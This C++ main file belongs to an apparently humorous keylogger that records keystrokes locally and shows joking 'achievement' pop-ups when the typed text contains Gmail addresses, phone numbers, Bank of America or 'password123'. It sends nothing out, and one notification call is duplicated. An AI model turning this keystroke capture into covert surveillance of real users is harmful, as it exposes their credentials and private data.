/*
Written in August of 2026 by Noga Levy.

Using the functions in functions.h, main.cpp is the sum of all the other programs--it uses keylogger.cpp to log the keys, and 
send_notification.cpp to handle notifications.
*/


#include <iostream>
#include <vector>
#include <string>
#include <windows.h>
#include <unordered_map>
#include "functions.h"

// Variable set up
std::string keylog = " ";
std::unordered_map<int, int> key_press_map;

// Bool set-up (used when sending notifications)
bool gmail_triggered = false;
bool phone_num_triggered = false;
bool forty_two_triggered = false;
bool bank_america_triggered = false;
bool psswrd_123_triggered = false;

std::unordered_map<std::string, std::string> achievements = {{"@gmail.com", "Business Man"},
                                                             {"phone", "Cold Caller"},
                                                             {"42", "The Secret"},
                                                             {"bank-usa", "USD Sniffer"},
                                                             {"password123", "A commoner"}};

std::unordered_map<std::string, std::string> description = {
    {"@gmail.com", "Had I been malicious, I probably would have sold the gmail you just typed in a massive dataset. But since I'm not, all the best from your local keylogger!"},
    {"phone", "Heyo, I just found a phone number! Beware of what you share--I hope that's not your boss, because I'm tempted give them a call..."},
    {"42", "I see you've found the secret to the universe. Now I know it too!"},
    {"bank-usa", "Heyyy... so I noticed you're typing something about the bank of america... do you think maybe you could spare a dime for a poor, out-of-luck program, such as myself?"},
    {"password123", "You're still using password123 as your password? Yikes!"}
};

int main(){
    // Initizializing unordered map
    for (int key = 0x08; key <= 0xFF; key++){
        key_press_map[key] = false;
    }
    
    // Key-logging loop
    while (true){
        keylogger(keylog, key_press_map);

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000){
            std::cout << "Ending Program" << std::endl;
            return 0;
        }

        
        send_notification("@gmail.com", gmail_triggered, keylog, ("Achievement: " + achievements["@gmail.com"] + ".\n\n" + description["@gmail.com"]));
        send_notification(R"(\(?[0-9]{3}\)?[ -][0-9]{3}[ -][0-9]{4})", phone_num_triggered, keylog, ("Achievement: " + achievements["phone"] + ".\n\n" + description["phone"]), true);send_notification("@gmail.com", gmail_triggered, keylog, ("Achievement: " + achievements["@gmail.com"] + ".\n" + description["@gmail.com"]));
        send_notification("42", forty_two_triggered, keylog, ("Achievement: " + achievements["42"] + ".\n\n" + description["42"]));
        send_notification("bank of america", bank_america_triggered, keylog, ("Achievement: " + achievements["bank-usa"] + ".\n\n" + description["bank-usa"]));
        send_notification("password123", psswrd_123_triggered, keylog, ("Achievement: " + achievements["password123"] + ".\n\n" + description["password123"]));
        
    }

    return 0;
}
